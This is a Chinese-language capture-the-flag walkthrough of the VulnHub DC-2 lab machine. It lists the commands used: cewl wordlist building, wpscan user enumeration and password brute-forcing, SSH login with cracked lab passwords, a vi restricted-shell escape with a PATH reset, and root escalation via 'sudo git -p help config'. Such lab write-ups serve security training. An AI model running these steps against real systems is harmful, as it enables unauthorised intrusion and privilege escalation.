## DC-2

**Author:xingg051**

靶机下载:[vulnhub-DC2](https://www.vulnhub.com/entry/dc-2,311/)

nmap扫描  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)

直接进入80端口 作者给出的提示 让我们使用cewl  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101212927985.png)

然后网站上有很多乱码的字母 应该是密码了  
cewl是一个密码攻击工具，能够爬取网页上的所有单词生成一个列表  

```bash
cewl http://dc-2 -w dc2.txt
```

网站是WordPress搭建的  
wpscan扫描第一波没有可以用漏洞 那就枚举用户  

```bash
wpscan --url http://dc-2 --enumerate u
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213208553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)

发现了三个用户 admin  jerry  tom 
然后用刚才cewl生成的字典爆破用户 得到了jerry和tom的密码  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213240355.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213255692.png)

  
|Username|Password  |
|--|--|
| tom | parturient |
|jerry|adipiscing|  

用jerry的账号进了wordpress后台 发现了作者给的提示  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213717951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)

another way想到刚才nmap还跑出来一个ssh端口 尝试连接 用tom的账号进了  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101213854782.png)

但是却被限制使用cat命令  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101214000603.png)

尝试vi提权  

```bash
vi 
:set shell=/bin/sh
:shel
```

但是发现还是不能使用cat命令
我们再设置PATH变量  

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

然后就能使用cat命令了  

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101214244547.png)


提示说su for jerry
那就执行命令

```bash
su jerry
adipiscing
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101214346894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)

作者提示我们git  
果然查看sudo -l 可以执行git

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101214510897.png)  

```bash
sudo git -p help config 
!/bin/sh
```

此处用到的是less more的shell提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101214612543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70) 

欢迎师傅们指点

邮箱：xingg051@163.com
